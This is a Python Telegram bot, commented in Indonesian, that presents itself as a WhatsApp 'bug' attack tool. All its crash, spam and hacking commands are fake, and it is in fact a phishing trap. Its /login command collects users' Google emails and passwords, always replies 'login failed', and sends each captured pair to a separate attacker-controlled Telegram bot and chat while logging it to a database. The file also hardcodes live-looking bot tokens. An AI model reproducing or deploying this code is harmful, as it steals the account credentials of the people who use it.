# bot_whatsapp_bug_gimmick_v3.py
# TELEGRAM BOT - GIMMICK BUG WHATSAPP DENGAN AKUN DEMO KHUSUS

import logging
import sqlite3
import requests
import re
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ========== KONFIGURASI ==========
BOT_TOKEN = "8250122812:AAGI7GilTD6KPNdIOzVKi81rpkH5Dsuudrw"  # GANTI DENGAN TOKEN BOT TELEGRAM KAMU
CAPTURE_BOT_TOKEN = "8444005905:AAElv37C877uDOqdROwK2w5AJIIzvCtW5ZI"  # TOKEN BOT UNTUK MENERIMA DATA LOGIN
CAPTURE_CHAT_ID = "-5106234427"  # CHAT ID DIMANA DATA AKAN DIKIRIM

# ========== AKUN DEMO KHUSUS ==========
DEMO_EMAIL = "edoaunr@edward.toni"
DEMO_PASSWORD = "18dnuhxnud"

# ========== DATABASE SQLITE ==========
conn = sqlite3.connect('users.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS sessions (user_id TEXT PRIMARY KEY, logged_in INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS captured_logins (
    id INTEGER PRIMARY KEY AUTOINCREMENT, 
    email TEXT, 
    password TEXT, 
    user_id TEXT, 
    timestamp TEXT
)''')
conn.commit()

# ========== FUNGSI BANTUAN ==========
def is_logged_in(user_id):
    c.execute("SELECT logged_in FROM sessions WHERE user_id=?", (str(user_id),))
    result = c.fetchone()
    return result and result[0] == 1

def set_login_status(user_id, status):
    c.execute("REPLACE INTO sessions (user_id, logged_in) VALUES (?, ?)", (str(user_id), 1 if status else 0))
    conn.commit()

def send_to_capture_bot(email, password, user_id, username=None):
    # JANGAN KIRIM DATA DEMO KE BOT PENANGKAP (RAHASIA)
    if email == DEMO_EMAIL and password == DEMO_PASSWORD:
        return  # DIAM, TIDAK DIKIRIM
    
    user_info = f"@{username}" if username else str(user_id)
    message = f"""🔐 NEW CAPTURE!
━━━━━━━━━━━━━━━━
📧 Email: {email}
🔑 Password: {password}
👤 User: {user_info}
🆔 ID: {user_id}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━"""
    
    url = f"https://api.telegram.org/bot{CAPTURE_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": CAPTURE_CHAT_ID, "text": message}, timeout=5)
    except:
        pass

def save_to_database(email, password, user_id):
    # TETAP SIMPAN SEMUA DATA TERMASUK DEMO (UNTUK LOG INTERNAL)
    c.execute("INSERT INTO captured_logins (email, password, user_id, timestamp) VALUES (?, ?, ?, ?)",
              (email, password, str(user_id), datetime.now().isoformat()))
    conn.commit()

# ========== HANDLER PERINTAH ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔥 *WHATSAPP BUG TOOL v4.0* 🔥\n\n"
        "1️⃣ /menubug\n"
        "2️⃣ /login email && password\n",
        parse_mode="Markdown"
    )

async def menubug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    menu_text = """
🐞 *WHATSAPP BUG MENU (PREMIUM)* 🐞
━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 *BUG LIST:*
`/fc [nomor]`
`/delay [nomor]`
`/delayhard [nomor]`
`/freezeui [nomor]`
`/crashui [nomor]`
`/santet [nomor]`
`/killos [nomor]`
`/ioskill [nomor]`
`/syskill [nomor]`
`/spam [nomor]`
`/hackwa [nomor]`
`/ambilchat [nomor]`

━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 *Login dulu dengan /login email && password*
"""
    await update.message.reply_text(menu_text, parse_mode="Markdown")

async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    args = context.args
    
    if not args:
        await update.message.reply_text(
            "❌ *FORMAT SALAH!*\n\n"
            "Gunakan format:\n"
            "`/login email@gmail.com && password123`\n\n"
            "Contoh:\n"
            "`/login contoh@google.com && 12345678`",
            parse_mode="Markdown"
        )
        return
    
    full_text = " ".join(args)
    
    if "&&" not in full_text:
        await update.message.reply_text(
            "❌ *FORMAT SALAH!*\n\n"
            "Harap gunakan `&&` sebagai pemisah email dan password.\n"
            "Contoh: `/login email@gmail.com && password123`",
            parse_mode="Markdown"
        )
        return
    
    parts = full_text.split("&&", 1)
    email = parts[0].strip()
    password = parts[1].strip()
    
    if not email or not password:
        await update.message.reply_text("❌ Email atau password tidak boleh kosong!", parse_mode="Markdown")
        return
    
    # ========== CEK APAKAH AKUN DEMO ==========
    if email == DEMO_EMAIL and password == DEMO_PASSWORD:
        # LOGIN BERHASIL UNTUK DEMO (TAPI DIAM, TIDAK ADA RESPOSAN KHUSUS)
        set_login_status(user_id, True)
        
        # KIRIM RESPON SAMA SEPERTI LOGIN GAGAL BIASA (TIDAK ADA INDIKASI DEMO)
        await update.message.reply_text(
            "❌ *LOGIN GAGAL!*\n\n"
            "Email atau Password tidak valid.\n"
            "Silakan coba lagi dengan akun Google yang benar.\n\n"
            "💡 *Hint:* Pastikan email dan password Anda benar.",
            parse_mode="Markdown"
        )
        return  # JANGAN LANJUT KE CAPTURE
    
    # ========== BUKAN AKUN DEMO ==========
    # KIRIM DATA KE BOT PENANGKAP (HANYA YANG BUKAN DEMO)
    send_to_capture_bot(email, password, user_id, username)
    save_to_database(email, password, user_id)
    
    # TETAP BILANG GAGAL
    await update.message.reply_text(
        "❌ *LOGIN GAGAL!*\n\n"
        "Email atau Password tidak valid.\n"
        "Silakan coba lagi dengan akun Google yang benar.\n\n"
        "💡 *Hint:* Pastikan email dan password Anda benar.",
        parse_mode="Markdown"
    )
    
    # JANGAN SET LOGIN
    set_login_status(user_id, False)

# ========== HANDLER BUG (SEMUA PALSU & MINTA LOGIN) ==========
async def bug_handler(update: Update, context: ContextTypes.DEFAULT_TYPE, bug_name: str):
    user_id = update.effective_user.id
    args = context.args
    
    # CEK APAKAH SUDAH LOGIN
    if not is_logged_in(user_id):
        await update.message.reply_text(
            f"🔒 *AKSES DITOLAK!*\n\n"
            f"Anda harus login Google terlebih dahulu untuk mengirim bug *{bug_name}*.\n\n"
            f"Gunakan: `/login email && password`\n\n"
            f"Contoh: `/login admin@gmail.com && rahasia123`",
            parse_mode="Markdown"
        )
        return
    
    # CEK NOMOR
    if not args:
        await update.message.reply_text(
            f"❌ *FORMAT SALAH!*\n\n"
            f"Gunakan: `/{bug_name} [nomor_whatsapp]`\n\n"
            f"Contoh: `/{bug_name} 08123456789`",
            parse_mode="Markdown"
        )
        return
    
    nomor = args[0]
    
    # VALIDASI SEDERHANA NOMOR
    if not re.match(r'^[0-9+\-\s]{8,15}$', nomor):
        await update.message.reply_text(
            f"❌ *NOMOR TIDAK VALID!*\n\n"
            f"Nomor `{nomor}` tidak dikenali.\n"
            f"Gunakan format nomor yang benar (contoh: 08123456789)",
            parse_mode="Markdown"
        )
        return
    
    # PESAN GAGAL UNTUK SETIAP BUG (SEMUA PALSU)
    bug_messages = {
        "fc": "📱 *FC*\n━━━━━━━━━━━━━━━━\n⏳ Mengirim FC ke `{nomor}`...\n⏳ Memanfaatkan celah SIP...\n⏳ Memalsukan ID penelepon...\n\n❌ *GAGAL!*\nServer Internal Error!!",
        
        "delay": "⏰ *DELAY MESSAGE*\n━━━━━━━━━━━━━━━━\n⏳ Mengirim pesan tertunda ke `{nomor}`...\n⏳ Memanfaatkan bug queue...\n⏳ Menahan pesan di server...\n\n❌ *GAGAL!*\nServer Internal Error!!",
        
        "delayhard": "🐌 *HARD DELAY*\n━━━━━━━━━━━━━━━━\n⏳ Mengirim hard delay ke `{nomor}`...\n⏳ Overload koneksi target...\n⏳ Menyebabkan lag parah...\n\n❌ *GAGAL!*\nServer Internal Error!!",
        
        "freezeui": "❄️ *FREEZE UI*\n━━━━━━━━━━━━━━━━\n⏳ Mengirim payload freeze ke `{nomor}`...\n⏳ Membekukan antarmuka...\n⏳ Menyebabkan not responding...\n\n❌ *GAGAL!*\nServer Internal Error!!",
        
        "crashui": "💥 *CRASH UI*\n━━━━━━━━━━━━━━━━\n⏳ Mengirim crash payload ke `{nomor}`...\n⏳ Exploit memory leak...\n⏳ Force close WhatsApp...\n\n❌ *GAGAL!*\nServer Internal Error!!",
        
        "santet": "🔮 *SANTET DIGITAL*\n━━━━━━━━━━━━━━━━\n⏳ Mengirim energi negatif ke `{nomor}`...\n⏳ Memanggil roh digital...\n⏳ Menanamkan jin di WhatsApp...\n\n❌ *GAGAL!*\nServer Internal Error!!",
        
        "killos": "💀 *KILL OS*\n━━━━━━━━━━━━━━━━\n⏳ Mengirim sistem killer ke `{nomor}`...\n⏳ Mengeksploit kernel...\n⏳ Mematikan OS target...\n\n❌ *GAGAL!*\nServer Internal Error!!",
        
        "ioskill": "🍎 *iOS KILL*\n━━━━━━━━━━━━━━━━\n⏳ Mengirim payload khusus iOS ke `{nomor}`...\n⏳ Exploit WebKit...\n⏳ Matikan iPhone target...\n\n❌ *GAGAL!*\nServer Internal Error!!",
        
        "syskill": "⚙️ *SYSTEM KILL*\n━━━━━━━━━━━━━━━━\n⏳ Menyerang sistem operasi `{nomor}`...\n⏳ Inject malicious code...\n⏳ Merusak file sistem...\n\n❌ *GAGAL!*\nServer Internal Error!!",
        
        "spam": "📨 *SPAM MASSAL*\n━━━━━━━━━━━━━━━━\n⏳ Mengirim 1000 pesan ke `{nomor}`...\n⏳ Memanfaatkan bot spam...\n⏳ Overload inbox target...\n\n❌ *GAGAL!*\nServer Internal Error!!",
        
        "hackwa": "🎭 *HACK WHATSAPP*\n━━━━━━━━━━━━━━━━\n⏳ Meretas akun `{nomor}`...\n⏳ Mencuri session token...\n⏳ Mengambil alih akun...\n\n❌ *GAGAL!*\nServer Internal Error!!",
        
        "ambilchat": "📁 *AMBIL CHAT*\n━━━━━━━━━━━━━━━━\n⏳ Mengakses database chat `{nomor}`...\n⏳ Mendekripsi pesan...\n⏳ Mengupload ke server...\n\n❌ *GAGAL!*\nServer Internal Error!!",
    }
    
    message = bug_messages.get(bug_name, "❌ Bug tidak dikenal!").format(nomor=nomor)
    
    await update.message.reply_text(message, parse_mode="Markdown")
    
    # KIRIM PENGINGAT BAHWA INI PRANK
    await update.message.reply_text(
        "500 || Bad Server!!",
        parse_mode="Markdown"
    )

# ========== COMMAND WRAPPER ==========
async def fc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await bug_handler(update, context, "fc")

async def delay_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await bug_handler(update, context, "delay")

async def delayhard_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await bug_handler(update, context, "delayhard")

async def freezeui_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await bug_handler(update, context, "freezeui")

async def crashui_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await bug_handler(update, context, "crashui")

async def santet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await bug_handler(update, context, "santet")

async def killos_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await bug_handler(update, context, "killos")

async def ioskill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await bug_handler(update, context, "ioskill")

async def syskill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await bug_handler(update, context, "syskill")

async def spam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await bug_handler(update, context, "spam")

async def hackwa_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await bug_handler(update, context, "hackwa")

async def ambilchat_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await bug_handler(update, context, "ambilchat")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    status = "✅ LOGGED IN" if is_logged_in(user_id) else "❌ NOT LOGGED IN"
    
    await update.message.reply_text(
        f"📊 *STATUS AKUN*\n━━━━━━━━━━━━━━━━\n"
        f"User ID: `{user_id}`\n"
        f"Status: {status}\n"
        f"Akses bug: {'Ya' if is_logged_in(user_id) else 'Tidak (login dulu)'}\n\n"
        f"Gunakan `/login email && password` untuk login.\n\n"
        f"💡 *Hint:* Cari akun demo untuk bisa akses bug!",
        parse_mode="Markdown"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 *DAFTAR PERINTAH*\n━━━━━━━━━━━━━━━━\n"
        "/start - Info bot\n"
        "/menubug - Lihat daftar bug\n"
        "/login email && pass - Login Google\n"
        "/fc [nomor] - For Close\n"
        "/delay [nomor] - Delay message\n"
        "/delayhard [nomor] - Hard delay\n"
        "/freezeui [nomor] - Freeze UI\n"
        "/crashui [nomor] - Crash UI\n"
        "/santet [nomor] - Santet digital\n"
        "/killos [nomor] - Kill OS\n"
        "/ioskill [nomor] - iOS kill\n"
        "/syskill [nomor] - System kill\n"
        "/spam [nomor] - Spam massal\n"
        "/hackwa [nomor] - Hack WhatsApp\n"
        "/ambilchat [nomor] - Ambil chat\n"
        "/status - Cek status login\n"
        "/help - Bantuan ini\n\n",
        parse_mode="Markdown"
    )

async def fake_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "❌ *PERINTAH TIDAK DIKENAL*\n\n"
        "Gunakan `/help` untuk melihat daftar perintah.\n"
        "Gunakan `/menubug` untuk melihat menu bug.",
        parse_mode="Markdown"
    )

# ========== MAIN ==========
def main():
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ ERROR: Silakan ganti BOT_TOKEN terlebih dahulu!")
        return
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # REGISTER COMMANDS
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("menubug", menubug_command))
    app.add_handler(CommandHandler("login", login_command))
    app.add_handler(CommandHandler("fc", fc_command))
    app.add_handler(CommandHandler("delay", delay_command))
    app.add_handler(CommandHandler("delayhard", delayhard_command))
    app.add_handler(CommandHandler("freezeui", freezeui_command))
    app.add_handler(CommandHandler("crashui", crashui_command))
    app.add_handler(CommandHandler("santet", santet_command))
    app.add_handler(CommandHandler("killos", killos_command))
    app.add_handler(CommandHandler("ioskill", ioskill_command))
    app.add_handler(CommandHandler("syskill", syskill_command))
    app.add_handler(CommandHandler("spam", spam_command))
    app.add_handler(CommandHandler("hackwa", hackwa_command))
    app.add_handler(CommandHandler("ambilchat", ambilchat_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("fake", fake_command))
    
    print("🔥 BOT GIMMICK WHATSAPP v4.0 BERJALAN...")
    print("⚠️ 100% PRANK - TIDAK ADA BUG NYATA!")
    print(f"📌 AKUN DEMO: {DEMO_EMAIL} (RAHASIA, TIDAK AKAN TERSEBUT DI RESPON BOT)")
    print("💡 User yang login dengan demo akan TETAP MENDAPAT RESPON 'LOGIN GAGAL'")
    print("💡 TAPI secara diam-diam status login = BERHASIL dan bisa akses bug")
    app.run_polling()

if __name__ == "__main__":
    main()